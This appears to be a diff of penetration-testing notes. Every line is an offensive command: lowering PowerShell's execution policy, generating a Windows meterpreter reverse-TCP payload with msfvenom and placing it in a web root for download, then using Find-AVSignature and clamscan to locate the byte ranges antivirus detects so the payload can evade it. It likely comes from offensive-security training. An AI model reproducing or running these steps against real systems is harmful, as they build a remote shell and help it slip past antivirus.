@@ -2,3 +2,6 @@ Set-ExecutionPolicy -ExecutionPolicy Unrestricted
 
 sudo msfvenom -p windows/meterpreter/reverse_tcp lhost=<> lport=<> -f exe -o /var/www/html/met.exe
 
+Import-Module .\Find-AVSignature.ps1
+Find-AVSignature -StartByte 0 -EndByte max -Interval 10000 -Path C:\Tools\met.exe -OutPath C:\Tools\avtest1 -Verbose -Force
+.\clamscan.exe C:\Tools\avtest1
